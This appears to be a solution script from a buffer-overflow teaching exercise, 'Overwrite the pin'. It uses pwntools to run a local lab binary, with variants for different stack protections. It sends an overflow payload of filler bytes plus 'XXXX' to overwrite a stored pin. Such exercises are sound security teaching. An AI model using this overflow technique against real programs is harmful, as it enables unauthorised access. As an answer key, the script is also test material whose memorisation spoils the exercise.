"""
Challenge 1: Overwrite the pin

SOLUTION
"""
from pwn import *

context.update(arch='i386', os='linux')
pty = process.PTY
# TODO: Select one binary:
elf = context.binary = ELF("./binaries/binary-1-no-protection")
# elf = context.binary = ELF("./binaries/binary-1-SG11-terminator")
# elf = context.binary = ELF("./binaries/binary-1-SG12-random")

p = process(elf.path)

print(p.recvline())

print("Craft payload")
payload = b'A' * 4 + b'XXXX'

print("Send payload")
print("\t" + str(payload))
p.sendline(payload)

print("Receive output")
print("\t" + str(p.recvline()))
